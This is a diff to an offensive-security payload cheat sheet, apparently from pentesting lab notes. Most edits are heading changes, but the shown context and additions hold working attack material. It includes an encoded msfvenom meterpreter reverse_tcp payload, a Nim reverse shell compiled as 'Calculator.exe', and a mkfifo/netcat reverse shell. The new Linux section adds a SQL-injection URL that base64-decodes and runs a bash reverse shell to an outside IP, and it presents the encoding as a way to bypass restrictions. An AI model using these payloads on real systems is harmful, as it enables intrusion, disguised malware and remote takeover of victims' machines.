@@ -47,7 +47,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 python2 -m SimpleHTTPServer 81
 ```
 
-## BAT
+### BAT
 
 **Examples**
 
@@ -72,7 +72,7 @@ if %errorlevel% equ 0 (
 )
 </code></pre>
 
-## **NIM**
+### **NIM**
 
 **Examples**
 
@@ -107,7 +107,7 @@ subl rev_shell.nim
 /root/.nimble/bin/nim c -d:mingw  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
 ```
 
-## **MSI**
+### **MSI**
 
 **Examples**
 
@@ -544,6 +544,22 @@ main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc $KALI 4
 ```
 
 
+
+## Linux
+
+### Bash
+
+You can bash64 encode payloads to bypass restictions&#x20;
+
+**Examples**
+
+[tryhack3m-sch3ma-d3mon.md](../walkthroughs/tryhackme/tryhack3m-sch3ma-d3mon.md "mention")
+
+**URL**
+
+```
+http://$VICTIM:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,%20null,%20null,%20null,%20sys_eval(%27echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2MS4xNDEvOTAwMSAwPiYx%20|%20base64%20-d%20%20|/bin/bash%27)%20--%20//
+```
 
 
 
